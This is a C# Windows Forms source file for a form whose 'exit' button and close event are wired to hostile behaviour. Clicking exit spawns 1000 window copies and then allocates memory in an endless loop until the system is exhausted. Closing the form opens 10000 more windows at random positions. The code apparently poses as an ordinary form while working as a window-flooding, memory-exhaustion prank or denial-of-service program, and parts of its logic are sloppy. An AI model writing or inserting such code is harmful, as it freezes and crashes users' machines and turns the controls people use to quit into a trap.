using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace schevelev_illarionov_beta_v1
{
    public partial class nazad : Form
    {
        public nazad()
        {
            InitializeComponent();
        }

        private void exit_Click(object sender, EventArgs e)
        {
            Size Screen = SystemInformation.PrimaryMonitorSize;
            int x = 0, y = 0;
            for (int i = 0; i < 1000; i++)
            {

                
                nazad main = new nazad();
                main.Show();
                if (x < 1000 && y < 1000)
                {
                    main.Location = new Point(x, y);
                    x = x + 3;
                    y = y + 3;
                }
                else
                {
                    main.Location = new Point(x, y);
                    x = x + 3;
                    y = 5 + 3;
                }
            }
            while (true)
            {
                var buf = new byte[1048576];
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = 1;
                }
                buffer.Add(buf);
                Console.WriteLine("Мегабайт загружено в память : " + (buffer.Count));
            }
        }

        private void nazad_FormClosed(object sender, FormClosedEventArgs e)
        {
            Size Screen = SystemInformation.PrimaryMonitorSize;
            for (int i = 0; i < 10000; i++)
            {

                Random rnd = new Random();
 


                int value1 = rnd.Next(0, Screen.Width);
                int value2 = rnd.Next(0, Screen.Height);
                nazad main = new nazad();
                main.Show();
                main.Location = new Point(value1, value2);
            }
            Application.Exit();
        }
        static List<byte[]> buffer = new List<byte[]>();
        private void nazad_Load(object sender, EventArgs e)
        {
            Size Screen = SystemInformation.PrimaryMonitorSize;



            if (500 > Program.x  && 500 > Program.x )
            {
                this.Location = new Point((Program.x), Program.y);
                Program.x = Program.x + 3;
                Program.y = Program.y + 3;
            }
            else
            {
                this.Location = new Point((Program.x), Program.y);
                Program.x = 30 + 5;
               Program.y = 5 + 5;
            }
           
        }
    }
}
